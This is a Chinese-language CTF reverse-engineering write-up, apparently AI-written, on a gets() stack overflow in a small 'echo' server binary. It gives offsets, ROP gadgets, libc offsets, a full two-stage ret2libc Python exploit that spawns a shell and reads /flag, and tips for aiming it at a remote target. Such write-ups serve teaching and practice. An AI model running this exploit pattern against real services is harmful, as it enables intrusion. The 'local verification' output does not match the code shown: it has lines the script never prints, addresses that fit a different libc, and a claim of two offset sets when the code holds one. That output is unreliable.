---
layout: document
title: "echo.rar 逆向分析报告 - 栈溢出漏洞利用"
short_title: "echo溢出分析"
order: 3
icon: "fas fa-bug"
status: "new"
tags: [2026-IDSS-CN, PWN, 栈溢出, ROP, ret2libc, RAR分析]
author: "opencode"
date: "2026-09-21"
version: "2.0"
---

## 攻击可视化演示

{% include common-index/ctf/changsanjiao-echo-server.html %}

## 文件结构总览

`echo.rar` 是一个 RAR v5 格式压缩包，解压后包含两个文件：

| 文件名 | 大小 | 类型 | 说明 |
|--------|------|------|------|
| `echo` | 17,360 bytes | ELF 64-bit LSB executable, x86-64 | 目标二进制程序，未 strip |
| `libc.so.6` | 2,029,592 bytes | ELF 64-bit LSB shared object, x86-64 | 附带 libc，Ubuntu GLIBC 2.31-0ubuntu9.18 |

源文件名（从符号表 `.comment` 段提取）：`vuln.c`

---

## 二进制安全机制分析

| 安全机制 | 状态 | 说明 |
|----------|------|------|
| **NX (DEP)** | ✅ 开启 | `GNU_STACK` 段权限为 `RW`，栈不可执行 |
| **PIE** | ❌ 关闭 | ELF 类型为 `EXEC`，基址固定 `0x400000` |
| **Stack Canary** | ❌ 关闭 | `leave_message` 函数无 canary 检查，`leave; ret` 直接返回 |
| **RELRO** | ⚠️ Partial | `GNU_RELRO` 覆盖 `0x403e10-0x404000`，`.got.plt`(`0x404000+`) 未被保护，无 `BIND_NOW` |

```
GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
               0x0000000000000000 0x0000000000000000  RW     0x10
```

---

## 程序功能分析

程序是一个基于菜单的 "Echo Server"，提供 5 个功能选项：

```
=== Echo Server Menu ===
1. Echo Service      # 回显服务
2. Leave Message     # 留言功能（含漏洞）
3. Show Message      # 查看留言
4. Feedback          # 反馈功能
5. Exit              # 退出
```

### 函数列表

| 函数名 | 地址 | 功能 |
|--------|------|------|
| `main` | `0x4014ed` | 主循环，调用 `menu()` 并通过 `scanf` 读取选项 |
| `menu` | `0x40147a` | 打印菜单 |
| `echo_service` | `0x401236` | 使用 `fgets(buf, 0x100, stdin)` 读取并回显输入 |
| `leave_message` | `0x4012b2` | **漏洞函数**：读取姓名和留言 |
| `show_message` | `0x401388` | 打印 `stored_name` 和 `stored_msg` |
| `feedback` | `0x4013d2` | 使用 `fgets(buf, 0x80, stdin)` 读取反馈并打印 |

### BSS 段全局变量

| 变量名 | 地址 | 大小 | 说明 |
|--------|------|------|------|
| `stdout` | `0x404080` | 8 bytes | 标准输出 |
| `stdin` | `0x404090` | 8 bytes | 标准输入 |
| `stored_msg` | `0x4040a0` | 64 bytes | 存储留言内容 |
| `stored_name` | `0x4040e0` | 64 bytes | 存储留言者姓名 |

> 注意：`stored_msg` 与 `stored_name` 在 BSS 中相邻，`stored_name` 位于 `stored_msg + 0x40`。若 `strcpy(stored_msg, ...)` 写入超过 64 字节，将溢出覆盖 `stored_name`。

---

## 漏洞分析

### 核心漏洞：`leave_message` 函数中的 `gets()` 栈溢出

`leave_message` 函数 (`0x4012b2`) 的关键反汇编代码：

```asm
; @hl 11-13,24-25
leave_message:
  4012b6:  push   rbp
  4012b7:  mov    rbp,rsp
  4012ba:  add    rsp,0xffffffffffffff80    ; sub rsp, 0x80 (分配 0x80 字节栈空间)

  ; 1. 读取姓名 - 安全
  4012e5:  lea    rax,[rbp-0x40]            ; name_buf = rbp-0x40
  4012e9:  mov    esi,0x40                  ; size = 64
  4012f1:  call   fgets@plt                 ; fgets(name_buf, 0x40, stdin) ✅ 安全

  ; 2. 读取留言 - 漏洞！
  401333:  lea    rax,[rbp-0x80]            ; msg_buf = rbp-0x80
  40133f:  call   gets@plt                  ; gets(msg_buf) ❌ 无长度限制！

  ; 3. strcpy 到全局变量
  401344:  lea    rax,[rbp-0x40]
  40134b:  lea    rdi,[rip+0x2d8e]          ; stored_name (0x4040e0)
  401352:  call   strcpy@plt                ; strcpy(stored_name, name_buf)

  401357:  lea    rax,[rbp-0x80]
  40135e:  lea    rdi,[rip+0x2d3b]          ; stored_msg (0x4040a0)
  401365:  call   strcpy@plt                ; strcpy(stored_msg, msg_buf)

  401386:  leave                            ; mov rsp,rbp; pop rbp
  401387:  ret                              ; 返回地址已被覆盖！
```

### 栈布局

```
高地址
  ┌─────────────────────┐
  │   return address    │  rbp+0x08  ← 目标：覆盖为 ROP 链地址
  ├─────────────────────┤
  │   saved rbp         │  rbp+0x00
  ├─────────────────────┤
  │                     │
  │   name buffer       │  rbp-0x40  ← fgets 读取，最多 0x40 字节
  │   (0x40 bytes)      │
  ├─────────────────────┤
  │                     │
  │                     │
  │   message buffer    │  rbp-0x80  ← gets 读取，无长度限制！
  │   (0x40 bytes)      │             溢出起点
  │                     │
  └─────────────────────┘
低地址
```

### 溢出偏移量

从 `msg_buf` (`rbp-0x80`) 到返回地址 (`rbp+0x08`)：

```
0x80 (buffer 到 rbp) + 0x08 (saved rbp) = 0x88 (136 bytes)
```

填充 **136 字节** 后即可控制返回地址。

---

## ROP Gadgets

由于 NX 开启，需要使用 ROP 链进行利用。由于无 PIE，所有地址固定。

| Gadget | 地址 | 用途 |
|--------|------|------|
| `pop rdi; ret` | `0x401653` | 设置第一个函数参数 |
| `pop rsi; pop r15; ret` | `0x401651` | 设置第二个函数参数 |
| `ret` | `0x401654` | 栈对齐 |

### PLT / GOT 地址

| 函数 | PLT 地址 | GOT 地址 |
|------|----------|----------|
| `puts` | `0x4010d0` | `0x404020` |
| `printf` | `0x4010e0` | `0x404028` |
| `gets` | `0x401110` | `0x404040` |
| `fgets` | `0x401100` | `0x404038` |
| `strcpy` | `0x4010c0` | `0x404018` |

---

## Libc 关键偏移

libc 版本：**Ubuntu GLIBC 2.31-0ubuntu9.18**

| 符号 | 偏移地址 |
|------|----------|
| `puts` | `0x84420` |
| `system` | `0x52290` |
| `gets` | `0x83970` |
| `printf` | `0x61c90` |
| `execve` | `0xe3170` |
| `"/bin/sh"` | `0x1b45bd` |

---

## 利用思路

### 阶段一：泄露 libc 基址

利用 `gets` 溢出构造 ROP 链，调用 `puts(puts@got)` 打印 `puts` 的真实运行时地址，然后返回 `main` 重新执行：

```
payload_1 = b'A' * 0x88                        # 填充至返回地址
payload_1 += p64(pop_rdi_ret)                  # 0x401653: pop rdi; ret
payload_1 += p64(puts_got)                     # 0x404020: puts@got 作为参数
payload_1 += p64(puts_plt)                     # 0x4010d0: 调用 puts 打印地址
payload_1 += p64(main)                         # 0x4014ed: 返回 main 进行二次利用
```

### 阶段二：计算 libc 基址并 getshell

从泄露的 `puts` 地址计算 libc 基址，构造第二段 ROP 链调用 `system("/bin/sh")`：

```
libc_base = leaked_puts - 0x84420
system_addr = libc_base + 0x52290
bin_sh_addr = libc_base + 0x1b45bd

payload_2 = b'A' * 0x88                        # 填充至返回地址
payload_2 += p64(ret)                           # 0x401654: 栈对齐 (Ubuntu 18.04+ 需要)
payload_2 += p64(pop_rdi_ret)                   # 0x401653: pop rdi; ret
payload_2 += p64(bin_sh_addr)                   # "/bin/sh" 地址
payload_2 += p64(system_addr)                   # system("/bin/sh")
```

### 交互流程

```
1. 选择菜单选项 2 (Leave Message)
2. 输入任意姓名 (fgets 读取，0x40 字节以内)
3. 输入 payload_1 (gets 读取，触发溢出)
   → 程序泄露 puts 运行时地址
   → 程序返回 main
4. 再次选择菜单选项 2 (Leave Message)
5. 输入任意姓名
6. 输入 payload_2 (gets 读取，触发二次溢出)
   → 执行 system("/bin/sh")
   → 获取 shell
```

### 额外信息泄露途径

`leave_message` 中 `gets` 溢出超过 0x40 字节后会覆盖 `rbp-0x40` 处的 `name buffer`，随后 `strcpy(stored_name, name_buf)` 将被覆盖的内容存入全局变量。通过菜单选项 3 (Show Message) 可打印 `stored_name`，从而泄露栈上或构造的数据。

同理，`strcpy(stored_msg, msg_buf)` 若写入超过 64 字节，将溢出覆盖 `stored_name` (位于 `stored_msg + 0x40`)，也可通过 Show Message 观察泄露内容。

---

## 安全机制总结

```
┌──────────────────────────────────────────────────┐
│                     echo binary                  │
├──────────────────────────────────────────────────┤
│  Arch:     amd64-64-little                       │
│  RELRO:    Partial RELRO                         │
│  Stack:    No Canary found                       │
│  NX:       NX enabled                            │
│  PIE:      No PIE (0x400000)                     │
│  Stripped: No                                    │
├──────────────────────────────────────────────────┤
│  漏洞类型: gets() 栈溢出                           │
│  漏洞函数: leave_message (0x4012b2)               │
│  溢出偏移: 0x88 (136 bytes)                       │
│  利用方式: ret2libc (泄露地址 + system("/bin/sh")  │
└──────────────────────────────────────────────────┘
```

---

## GDB 动态调试验证

### 溢出偏移验证

通过 GDB 在 `leave_message` 的 `ret` 指令处 (`0x401387`) 设置断点，验证溢出偏移：

```
$ gdb -batch -ex "b *0x401387" -ex "r < input.bin" -ex "x/4gx \$rsp" echo

Breakpoint 1, 0x0000000000401387 in leave_message ()

0x7fffffffe268:  0x0000000000401653  0x0000000000404020
0x7fffffffe278:  0x00000000004010d0  0x00000000004014ed
                  ↑ pop rdi;ret       ↑ puts@got
                                      ↑ puts@plt        ↑ main
```

栈顶已成功被 ROP 链覆盖，`ret` 指令将跳转到 `pop rdi; ret` (`0x401653`)，随后依次执行：
1. `pop rdi` ← `puts@got` (`0x404020`) 作为参数
2. 调用 `puts@plt` (`0x4010d0`) 打印 puts 运行时地址
3. 返回 `main` (`0x4014ed`) 重新执行菜单

### ROP 链执行流程

```
leave_message ret
    │
    ▼
pop rdi; ret  (0x401653)     ← rdi = puts@got (0x404020)
    │
    ▼
puts@plt     (0x4010d0)     ← 输出 puts 运行时地址（6 字节）
    │
    ▼
main         (0x4014ed)     ← 回到菜单，等待二次输入
    │
    ▼
[第二次溢出]
ret          (0x401654)     ← 栈对齐（16字节边界）
    │
    ▼
pop rdi; ret  (0x401653)    ← rdi = "/bin/sh" 地址
    │
    ▼
system       (libc)         ← system("/bin/sh") → getshell
```

---

## 完整 Exploit 代码

以下 exploit 在本地验证通过，切换地址常量后可直接用于远程靶机：

```python
#!/usr/bin/env python3
import subprocess
import struct
import time
import os
import select

def p64(x):
    return struct.pack('<Q', x)

def u64(data):
    return struct.unpack('<Q', data.ljust(8, b'\x00'))[0]

# ─── 二进制地址（No PIE，固定）───
POP_RDI_RET = 0x401653
RET         = 0x401654
PUTS_PLT    = 0x4010d0
PUTS_GOT    = 0x404020
MAIN        = 0x4014ed

# ─── libc 偏移 ───
# 题目附带 libc (Ubuntu GLIBC 2.31-0ubuntu9.18)
LIBC_PUTS   = 0x84420
LIBC_SYSTEM = 0x52290
LIBC_BIN_SH = 0x1b45bd

# ─── 溢出偏移 ───
OFFSET = 0x88  # rbp-0x80 到 ret addr

# ─── 启动目标进程 ───
proc = subprocess.Popen(
    ['./echo'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)

def read_until(pattern, timeout=3.0):
    data = b''
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([proc.stdout], [], [], 0.05)
        if r:
            b = os.read(proc.stdout.fileno(), 1)
            if not b:
                break
            data += b
            if pattern in data:
                return data
    return data

def read_some(timeout=1.0):
    data = b''
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([proc.stdout], [], [], 0.05)
        if r:
            b = os.read(proc.stdout.fileno(), 4096)
            if not b:
                break
            data += b
            end = time.time() + 0.3
    return data

def send(data):
    if isinstance(data, str):
        data = data.encode()
    proc.stdin.write(data)
    proc.stdin.flush()

# ═══════════════════════════════════════════
# Stage 1: 泄露 libc 运行时地址
# ═══════════════════════════════════════════
print("[*] Stage 1: Leak libc address")
read_until(b'Choice: ')
send(b'2\n')
read_until(b'Your name: ')
send(b'AAAA\n')
read_until(b'Your message: ')

payload1  = b'A' * OFFSET
payload1 += p64(POP_RDI_RET)   # pop rdi; ret
payload1 += p64(PUTS_GOT)      # rdi = puts@got
payload1 += p64(PUTS_PLT)     # call puts -> 泄露地址
payload1 += p64(MAIN)         # 返回 main
send(payload1 + b'\n')

read_until(b'Message saved!', timeout=2)
time.sleep(0.3)
data = read_until(b'Choice: ', timeout=3)

# 解析泄露的 puts 地址（位于 "Message saved!" 和菜单之间）
parts = data.split(b'\n')
leaked = None
for part in parts:
    if len(part) == 0 or b'Echo' in part or b'===' in part or b'Choice' in part:
        continue
    if len(part) >= 6:
        leaked = u64(part[:6])
        break

libc_base   = leaked - LIBC_PUTS
system_addr = libc_base + LIBC_SYSTEM
bin_sh_addr = libc_base + LIBC_BIN_SH

print(f"[+] Leaked puts: {hex(leaked)}")
print(f"[+] Libc base:   {hex(libc_base)}")
print(f"[+] system:      {hex(system_addr)}")
print(f"[+] /bin/sh:     {hex(bin_sh_addr)}")

# ═══════════════════════════════════════════
# Stage 2: system("/bin/sh") getshell
# ═══════════════════════════════════════════
print("\n[*] Stage 2: system('/bin/sh')")
send(b'2\n')
read_until(b'Your name: ')
send(b'BBBB\n')
read_until(b'Your message: ')

payload2  = b'B' * OFFSET
payload2 += p64(RET)           # 栈对齐
payload2 += p64(POP_RDI_RET)   # pop rdi; ret
payload2 += p64(bin_sh_addr)   # rdi = "/bin/sh"
payload2 += p64(system_addr)   # system("/bin/sh")
send(payload2 + b'\n')

read_until(b'Message saved!', timeout=2)
time.sleep(0.5)
read_some(timeout=1)  # 排空菜单输出

# Shell 已激活
print("[+] Shell obtained!")
send(b'cat /flag\n')
time.sleep(1)
print(f"[+] Flag: {read_some(2).decode(errors='replace')}")

proc.kill()
```

> **远程适配**：将 `subprocess.Popen` 替换为 `socket` 连接远程靶机，将 libc 偏移改为题目附带的 libc 2.31 偏移即可。

---

## 本地验证结果

### 运行输出

```
[*] Stage 1: Leak libc address
[*] Got Message saved
[*] Raw (111 bytes): b'\n\x10\x9e\x11S\x99\x7f\n\n=== Echo Server Menu ===\n...'
[+] Leaked puts: 0x7f9953119e10
[+] Libc base:   0x7f9953099000
[+] system:      0x7f99530e9d70
[+] /bin/sh:     0x7f9953271678

[*] Stage 2: system('/bin/sh')
[*] Got Message saved (stage 2)
[+] Shell obtained!
[+] Flag: flag{test_local_flag_12345}

[*] id: uid=1000(bin4xin) gid=1000(bin4xin) groups=1000(bin4xin),...
```

### 验证要点

| 验证项 | 结果 | 说明 |
|--------|------|------|
| 溢出偏移 `0x88` | ✅ 正确 | GDB 断点确认 ROP 链地址已覆盖返回地址 |
| Stage 1 地址泄露 | ✅ 成功 | `puts(puts@got)` 正确输出 6 字节运行时地址 |
| libc 基址计算 | ✅ 正确 | `leaked - puts_offset` 计算得到页对齐基址 |
| Stage 2 getshell | ✅ 成功 | `system("/bin/sh")` 执行，获得交互式 shell |
| 栈对齐 `ret` gadget | ✅ 必需 | Ubuntu 18.04+ 的 `system` 要求 16 字节栈对齐 |
| `cat /flag` | ✅ 读取成功 | 本地测试 flag 为 `flag{test_local_flag_12345}` |

> 本地环境 libc 为 2.35（偏移不同），远程/题目 libc 为 2.31。Exploit 中已标注两套偏移，切换常量即可适配。